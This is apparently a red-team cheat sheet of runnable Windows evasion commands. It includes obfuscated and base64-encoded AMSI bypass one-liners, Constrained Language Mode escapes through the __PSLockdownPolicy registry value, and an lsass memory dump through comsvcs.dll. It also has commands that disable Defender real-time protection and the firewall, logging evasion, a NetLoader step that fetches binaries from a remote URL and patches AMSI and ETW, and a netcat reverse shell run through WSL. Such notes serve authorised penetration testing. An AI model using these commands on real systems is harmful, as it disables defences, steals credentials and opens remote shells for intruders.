# Evasion
## Index
* [General](#General)
* [PowerShell](#PowerShell)
	* [Execution-policy](#Execution-policy)
	* [AMSI](#AMSI)
	* [Constrained Language Mode](#Constrained-Lanuage-Mode)
		* [Escapes for Constrained Lanuage Mode](#Escapes-for-Constrained-Language-Mode)
	* [Applocker](#Applocker)
		* [LOLBAS](#LOLBAS)
	* [Logging evasion](#Logging-evasion)
	* [Just Enough Admin](#Just-Enough-Admin)
* [Windows Defender](#Windows-Defender)
* [AV Bypass](#AV-Bypass)
* [Privileges](#Privileges)
* [Windows Subsystem for Linux WSL](#Windows-Subsystem-for-Linux-WSL)

## General
#### Get all GPO's applied to a machine
- Run with elevated prompt
```
gpresult /H gpos.html
```

#### Powershell detections
- System-wide transcription
- Script Block logging 
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

## PowerShell
### Start 64 bit powershell
```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

### Execution-policy
#### Get Execution policy
```
Get-Executionpolicy
```

#### Bypass execution policy
- Not meant to be a security measure
```
powershell –executionpolicy bypass .\script.ps1
powershell –c <cmd>
powershell –enc
powershell.exe -executionpolicy bypass
```

### AMSI
- https://github.com/aloksaurabh/OffenPowerSh/blob/master/Bypass/Invoke-AlokS-AvBypass.ps1
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

#### Generating a new string
- Use the string below
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
- Fuck around with invoke-obfuscation till it doesn't get detected anymore

#### Amsi bypass base64 encoded strings
```
function b64decode
{
    param ($encoded)
    $decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
    return $decoded
}

$1 = b64decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
$2 = b64decode("YW1zaUluaXRGYWlsZWQ=")
$3 = b64decode("Tm9uUHVibGljLFN0YXRpYw==")

[Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true)
```

#### Creating scripts that bypass amsi
- Remove all comments + whitespaces http://www.powertheshell.com/
- Check for amsi strings https://github.com/RythmStick/AMSITrigger
- Then obfuscate strings with https://github.com/danielbohannon/Invoke-Obfuscation
- Repeat

### Constrained Lanuage Mode
#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

### Escapes for Constrained Language Mode
#### Launch Powershell Version 2
```
Powershell.exe -Version 2
```

#### Overwrite __PSLockdownPolicy variable
- If CLM is not implemented correctly and is using __PSLockdownPolicy

#### Check the __PSLockdownPolicy value
- Value 4 is enabled
- Value 8 is disabled
```
(Get-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy").__PSLockDownPolicy
```

#### Set lockdown policy to 8 and check language mode
```
Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8
powershell.exe
$ExecutionContext.SessionState.LanguageMode
```

#### Script to disable it
- https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
```
#Requires -RunAsAdministrator

If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
    Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8

    Start-Process -File PowerShell.exe -Argument "-file $($myinvocation.mycommand.definition)"
    Break
}

Write-Host $ExecutionContext.SessionState.LanguageMode

Start-Sleep -s 10
```

### PowerShx
- https://github.com/iomoath/PowerShx
```
rundll32 PowerShx.dll,main -i 
PowerShx.exe -i  
```

### PowerShdll Run PowerShell with dlls only.
- https://github.com/p3nt4/PowerShdll
- Does not require access to powershell.exe as it uses powershell automation dlls.
```
rundll32 PowerShdll,main -i
```

#### Download files with certutil
- You can not use iwr but you can use certutil in constrained language mode
```
certutil -urlcache -split -f <URL>
```

#### Execute scripts
- It is possible to execute scripts on the filesystem but you can't load them!
- If applocker is there enumerate it to find a directory that lets you execute scripts in

### Applocker
- AppLocker rules are split into 5 categories - Executable, Windows Installer, Script, Packaged App and DLLs, and each category can have its own enforcement (enforced, audit only, none).
- AppLocker has a set of default allow rules such as, "allow everyone to execute anything within C:\Windows\*" - the theory being that everything in C:\Windows is trusted and safe to execute.
- The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:
  - Executing untrusted code via trusts LOLBAS's.
  - Finding writeable directories within "trusted" paths.
  - By default, AppLocker is not even applied to Administrators.
- Uploading into ```C:\Windows``` requires elevated privileges, but there are places like ```C:\Windows\Tasks``` that are writeable by standard users. 
- DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.
- Good repo for bypasses: https://github.com/api0cradle/UltimateAppLockerByPassList

#### Check if applocker policy is running
```
Get-AppLockerPolicy -Effective
```

#### Enumerate applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Check applocker policy in registery
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Parse GPO applocker
- https://github.com/PowerShell/GPRegistryPolicy
```
Get-DomainGPO -Identity *applocker*
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### Check for WDAC
```
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
```
runas /netonly /user:<DOMAIN\<USER> cmd.exe
winrs -r:<PC NAME> cmd
```

#### Check for the policy
- ```.p7b``` is a signed policy
- Check if there are any ```.xml``` files which didn't got removed with the policy
```
ls C:\Windows\system32\CodeIntegrity
```

### LOLBAS
- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/

#### For example dumping lsass:
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp
```

### Logging evasion
#### Invisi-shell
- Bypasses Sytem-Wide transcript
- https://github.com/OmerYa/Invisi-Shell
- Type exit from the new PowerShell session to complete the clean-up.

#### With admin privileges
```
./RunWithPathAsAdmin.bat 
```

#### With non-admin privileges:
```
RunWithRegistryNonAdmin.bat
```

##### Winrs
- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
```
winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
```

##### Com objects
- https://github.com/bohops/WSMan-WinRM

### Just Enough Admin
- Defines allowed cmdledt and commands that are allowed by defining role capabilities.

#### Connect with JEA endpoint
- Use DOMAIN\USER format
```
$creds = get-credential
$sess = New-PSSession -ComputerName <FQDN> -ConfigurationName <JEA ENDPOINT CONF NAME> -Credential $creds
```

#### Implementing JEA
- First create a capability file and add commands to it.
```
New-PSRoleCapabilityFile -Path .\JEA.psrc

New-PSSessionConfigurationFile -SessionType RestrictedRemoteServer -Path .\JEA.pssc
Register-PSSessionConfiguration -Path .\JEA.pssc -Name 'Persist' -Force 
```

#### Abuse JEA
- Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.
- Allows the use of wildcard.
- Check which commands are allowed to run and google for abuses
```
Get-Command

# Abuse example
Start-Process cmd.exe calc.exe
```

#### Get the PSSession configurations (and JEA)
```
Get-PSSessionconfiguration
```

#### Get PSSession capabilities
```
Get-PSSessionCapability -ConfigurationName <NAME> -Username <DOMAIN>\<USERNAME>
```

## Windows Defender
#### Check if windows defender is running
```
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

#### Get info about Windows Defender
```
Get-MpPreference
```

#### Find excluded folder from Windows Defender
```
Get-MpPreference | select Exclusion*
(Get-MpPreference).Exclusionpath
```

#### Create exclusion
```
Set-MpPreference -ExclusionPath "<path>"
```

#### Parse GPO applocker
- https://github.com/PowerShell/GPRegistryPolicy
```
Get-DomainGPO -Identity *defender*
Parse-PolFile "<GPCFILESYSPATH FROM GET-DOMAINGPO>\Machine\Registry.pol" | select ValueName, ValueData
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
```

#### Disable Firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 

powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
```

#### Open port on firewall
```
netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>
```

## AV Bypass

### Bypassing Microsoft Defender
- Use https://github.com/rasta-mouse/ThreatCheck or https://github.com/matterpreter/DefenderCheck
1. Run Defendercheck ```DefenderCheck.exe <PATH TO BINARY>```
2. Replace string which gets detected.
3. Recompile and check again!

### Bypassing AV C# binaries
- Obfuscate C# binary with https://github.com/mkaring/ConfuserEx
1. Launch ConfuserEx
2. In Project tab select the Base Directory where the binary file is located.
3. In Project tab Select the Binary File that we want to obfuscate.
4. In Settings tab add the rules.
5. In Settings tab edit the rule and select the preset as `Normal`.
6. In Protect tab click on the protect button.
7. We will find the new obfuscated binary in the Confused folder under the Base Directory.

### Bypassing AV Go binaries
- https://github.com/burrowers/garble

### Obfuscate scripts
- Remove comments https://github.com/yoda66/PowerStrip
- Remove all comments + whitespaces http://www.powertheshell.com/
- Check for amsi strings https://github.com/RythmStick/AMSITrigger
- Obfuscate strings https://github.com/danielbohannon/Invoke-Obfuscation
- https://github.com/JoelGMSec/Invoke-Stealth

### Offensive .NET
- https://github.com/Flangvik/NetLoader
- Load binary from filepath or URL and patch AMSI & ETW while executing
```
C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Use custom exe Assembyload to run netloader in memory and then load binary
```
C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Compile defendercheck
- Using visual studio code
```
csc.exe /target:exe /out:C:\tools\defendercheck.exe C:\Tools\DefenderCheck\DefenderCheck\DefenderCheck\Program.cs
```

#### Random notes
```
pyinstaller.exe --onefile .\CVE-2021-1675.py
pyarmor pack --clean -e "--onefile " .\CVE-2021-1675.py
```

## Privileges

#### Check current privileges
```
whoami /priv
```

### SeDebugPrivileges
- http://woshub.com/obtain-sedebugprivilege-debug-program-policy-enabled/

#### Export the current user rights set by the group policies to a text file:
```
secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
```

#### Edit the secpolicy.ing
- Change the SeDebugPrivileges to ```S-1-5-32-544``` the Local administrator group.
```
notepad.exe secpolicy.inf
```
- Or converts sids: http://woshub.com/convert-sid-to-username-and-vice-versa/

#### Save the new user rights set
```
secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIGHTS
```

#### Start cmd again
- Check privileges with ```whoami``` if not having SeDebugPrivilege do ```PsExec.exe -i cmd.exe```

### Enable SMB shares for local admin users
```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f
Get-service LanmanServer | restart-service -verbose
```

## Windows Subsystem for Linux WSL
- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.

#### Netcat shell
```
wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
```

#### Bypass whitelisting
- In both the above cases, the Windows application will have:
  – Same permissions as the WSL process. 
  – Run as the current Windows user.
  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
```
bash.exe -c cmd.exe
wsl.exe cmd.exe
```
